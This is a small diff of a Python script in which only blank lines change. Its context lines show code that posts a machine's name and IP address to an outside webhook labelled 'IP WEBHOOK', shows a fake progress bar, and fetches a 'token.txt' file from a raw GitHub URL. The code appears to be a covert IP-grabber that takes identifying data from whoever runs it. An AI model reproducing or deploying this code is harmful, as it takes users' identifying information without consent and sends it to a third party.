@@ -7,7 +7,6 @@ t = time.strftime("%H:%M:%S", t)
 d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
 d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
 requests.post(u, json=d)
-
 def p(percentage):
     bar_length = 50
     block = int(round(bar_length * percentage))
@@ -19,7 +18,6 @@ for i in range(n + 1):
     pe = i / float(n)
     p(pe)
     time.sleep(0.1)  
-
 url = "https://raw.githubusercontent.com/hmmmmmmmmmmm-ctrl/hum/main/token.txt"
 response = requests.get(url)
 if response.status_code == 200:
